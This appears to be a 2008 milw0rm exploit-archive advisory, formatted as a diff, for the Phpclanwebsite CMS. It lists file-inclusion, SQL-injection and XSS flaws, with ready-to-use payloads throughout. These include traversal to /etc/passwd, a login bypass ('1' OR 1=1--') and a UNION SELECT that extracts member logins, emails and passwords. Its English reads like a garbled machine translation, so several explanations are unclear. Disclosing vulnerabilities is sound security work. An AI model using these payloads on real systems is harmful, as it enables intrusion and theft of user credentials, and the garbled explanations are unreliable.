@@ -1,0 +1,52 @@
+Phpclanwebsite <= 1.23.3 Fix Pack #5 (File Including/SQL/XSS) Multiple Remote Vulnerabilities
+
+The description:
+The set vulnerability in CMS Phpclanwebsite versions 1.23.3 Fix Pack #5 and more low was revealed.
+
+1. Multiple File Including Vulnerabilities
+
+Vulnerability exists for the reason that direct access to some files, around logicians of work of the appendix is possible.
+It gives the chance to redefine internal variables which are transferred as arguments in function include ().
+Examples of vulnerable files:
+/theme/superchrome/box.php?boxname=../../../../../etc/passwd%00
+/phpclanwebsite/footer.php?theme=../../../../../etc/passwd%00
+etc
+
+The note:
+For vulnerability operation the following options PHP are required: register_globals=On and magic_quotes_gpc=Off
+
+2. Multiple SQL Injection Vulnerabilities
+
+The appendix everywhere does not check the variables transferred from outside of the user. It allows to carry out any SQL Injection.
+Examples of vulnerable files:
+SQL Injection (insert) -
+ /index.php?page='SQL
+SQL Injection (delete) -
+ /index.php?page=processforms&ok=1&SP=1&form_id=2
+ , where "form_id" the identifier of the deleted user
+SQL Injection (select) -
+ /index.php?page=login
+ POST:pcwlogin='SQL&pcw_pass='SQL
+
+ /index.php?page=login
+ POST:pcwlogin=1'+OR+1=1--&pcw_pass=1
+
+SQL Injection (select) -
+ /index.php?page=downloads&func=search
+ POST:searchvalue='SQL&whichfield=SQL
+
+ /index.php?page=downloads&func=search
+ POST:searchvalue=1&whichfield=dl_name>1)+limit+0+union+select+tag,2,3,login,5,6,7,email,9,password,11,12,13,14,15+from+cws_members--
+etc
+
+The note:
+For operation of all SQL Injection vulnerabilities, except vulnerability in parametre "whichfield", are required disconnected magic_quotes_gpc.
+
+3. Multiple Cross-site Scripting Vulnerabilities
+
+The appendix everywhere does not check the variables transferred from outside of the user. It allows to carry out any code in a context of a user browser.
+Examples of vulnerable files:
+/index.php?page='><script>alert('XSS')</script>
+etc
+
+# milw0rm.com [2008-12-18]
